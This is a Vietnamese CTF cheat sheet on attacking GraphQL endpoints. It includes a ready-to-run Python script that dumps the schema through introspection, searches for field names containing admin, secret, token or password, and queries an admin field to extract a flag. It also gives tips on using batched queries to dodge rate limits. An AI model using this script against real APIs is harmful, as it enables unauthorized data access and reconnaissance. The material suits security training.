# GraphQL (1 URL duy nhất, tự chọn dữ liệu muốn lấy)

Bình thường mỗi loại dữ liệu có 1 URL riêng (`/user`, `/order`...). GraphQL làm khác: chỉ có **1 URL duy nhất** (thường `/graphql`), và bạn tự viết 1 "câu hỏi" (gọi là query) mô tả đúng field (trường dữ liệu) mình muốn lấy, gửi lên, server trả đúng field đó — giống như tự điền vào 1 form "tôi muốn xem: tên, email" thay vì server tự quyết định trả gì. Vì linh hoạt vậy, nếu server không giới hạn kỹ, bạn có thể tự hỏi thêm field không được phép xem, hoặc dùng chức năng "introspection" (tự hỏi server "mày có field/loại dữ liệu gì") để dò ra toàn bộ cấu trúc dữ liệu mà không cần ai nói trước cho bạn biết.

Trên Burp bạn nhận ra lỗi này khi: thấy request POST tới `/graphql` (hoặc `/api/graphql`), body là JSON dạng `{"query": "..."}`. Gửi thử query `{__schema{types{name}}}` — nếu response trả về JSON đầy field `__schema`, `types`... nghĩa là server cho phép "tự hỏi ngược" (introspection đang mở), bạn có ngay bản đồ toàn bộ dữ liệu để tìm field nhạy cảm.

## Snippet copy-là-chạy

```python
import re
import requests

base = "http://target"
FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")

def solve_one(session, base_url):
    url = f"{base_url}/graphql"

    # Bước 1: hỏi ngược server "mày có type/field gì" (introspection rút gọn)
    r1 = session.post(url, json={"query": "{__schema{types{name fields{name}}}}"}, timeout=5)
    try:
        types = r1.json()["data"]["__schema"]["types"]
    except Exception:
        types = []
        print("Introspection không trả được -- có thể đã bị tắt, xem phần Lưu ý nhanh")

    # Bước 2: tự tìm field có tên nghe "nhạy cảm" trong toàn bộ type vừa lấy được
    sensitive_words = ["admin", "secret", "flag", "internal", "token", "password"]
    hits = []
    for t in types:
        for f in (t.get("fields") or []):
            if any(w in f["name"].lower() for w in sensitive_words):
                hits.append((t["name"], f["name"]))
    print("Field nghi ngờ:", hits)

    # Bước 3: thử query trực tiếp field nghi ngờ nhất (sửa đúng tên theo kết quả bước 2)
    # Ví dụ: type "AdminPanel" có field "flag"
    r3 = session.post(url, json={"query": "{ adminPanel { flag } }"}, timeout=5)
    m = FLAG_RE.search(r3.text)
    return m.group(0) if m else None


if __name__ == "__main__":
    s = requests.Session()
    s.verify = False
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- Mọi request GraphQL gần như luôn là POST tới 1 URL, body JSON có key `"query"` — không có khái niệm nhiều URL như REST, nên bạn không cần đoán URL khác, chỉ cần đổi nội dung chuỗi `query` để hỏi thứ khác.
- `__schema{types{name fields{name}}}` là 1 câu hỏi đặc biệt có sẵn trong GraphQL, nghĩa là "cho tôi xem toàn bộ cấu trúc dữ liệu của mày" — nếu server không tắt, bạn có ngay danh sách type (giống "bảng" trong database) và field (giống "cột").
- Script tự lọc field theo từ khoá (`admin`, `secret`, `flag`...) vì khi có hàng trăm field, bạn không có thời gian đọc hết bằng mắt — để máy tự tìm chỗ đáng nghi trước.
- Field tồn tại trong schema không có nghĩa là bạn ĐƯỢC xem nó — GraphQL không tự kiểm quyền, việc kiểm quyền do code của từng field tự quyết định; rất nhiều lúc dev quên kiểm ở 1 field lẻ dù field khác đã kiểm đúng. Đây là lý do field "admin" có thể trả dữ liệu dù bạn chỉ là user thường.

## Lưu ý nhanh

- Nếu bước 1 báo lỗi "introspection is disabled" — nghĩa là server đã tắt tính năng tự hỏi ngược (cấu hình đúng); bạn phải đoán tên field theo quy ước thông thường (`user`, `admin`, `order`...) hoặc xem code JS của trang để tìm đúng tên query/field thật đang được dùng.
- Nếu query trả về `null` cho mọi field dù cú pháp đúng, thường do thiếu tham số bắt buộc (argument) — gọi lại introspection đầy đủ hơn (thêm `args{name}}`) để biết đúng tên/kiểu tham số.
- Một số server còn cho gửi NHIỀU query trong 1 request (dạng JSON là 1 list `[...]` thay vì 1 object) — kiểu này hay dùng để né giới hạn 30 request/phút của giải khi brute-force, nhưng chỉ dùng hợp lệ trong phạm vi thi đấu, không phải cách lách luật nộp flag.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
